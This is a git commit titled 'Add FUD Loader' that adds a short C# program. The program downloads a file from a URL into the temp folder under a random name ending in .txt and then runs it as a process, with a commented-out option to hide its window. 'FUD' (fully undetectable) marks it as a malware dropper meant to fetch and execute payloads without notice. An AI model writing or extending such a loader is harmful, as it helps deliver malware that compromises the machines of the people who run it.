1c567401154d116ee1ba98ad510e2acd1bcc543f
Katyara22 <irina.pryduvys@gmail.com>
2022-08-14 09:13:32 -0700

    Add FUD Loader

---
+++ FUDLoader/Program.cs
@@ -0,0 +1,51 @@
+﻿using System;
+using System.IO;
+using System.Net;
+using Microsoft.Win32;
+using System.Diagnostics;
+
+namespace FUDLoader
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            string url = "https://github.com/";
+            string FileLocate = FileName();
+
+            FileName();
+            Download(FileLocate, url);
+            Runprocess(FileLocate);
+        }
+
+        private static void Download(string FileLocate, string url)
+        {
+            WebClient client = new WebClient();
+
+            client.DownloadFile(new Uri(url), FileLocate + ".txt");
+        }
+
+        private static string FileName()
+        {
+            string Temp = Path.GetTempPath();
+            string Ran = Path.GetRandomFileName();
+            string FileLocate = Temp + Ran;
+
+            return FileLocate;
+        }
+
+        private static void Runprocess(string FileLocate)
+        {
+            Process process = new Process
+            {
+                StartInfo =
+                {
+                    FileName = FileLocate + ".txt",
+                    //WindowStyle = ProcessWindowStyle.Hidden
+                }
+            };
+
+            process.Start();
+        }
+    }
+}
